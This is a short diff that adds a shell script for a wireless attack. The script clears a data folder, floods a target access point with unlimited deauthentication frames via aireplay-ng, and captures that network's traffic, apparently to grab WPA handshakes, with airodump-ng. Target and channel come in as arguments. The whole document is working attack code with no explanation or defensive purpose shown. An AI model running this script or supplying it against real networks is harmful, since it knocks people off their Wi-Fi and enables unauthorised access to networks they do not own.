@@ -1,0 +1,4 @@
+rm -rf data
+mkdir -p data
+aireplay-ng --deauth 0 -a $1 wlan0mon > /dev/null
+airodump-ng --bssid $1 --channel $2 --write data/capture wlan0mon
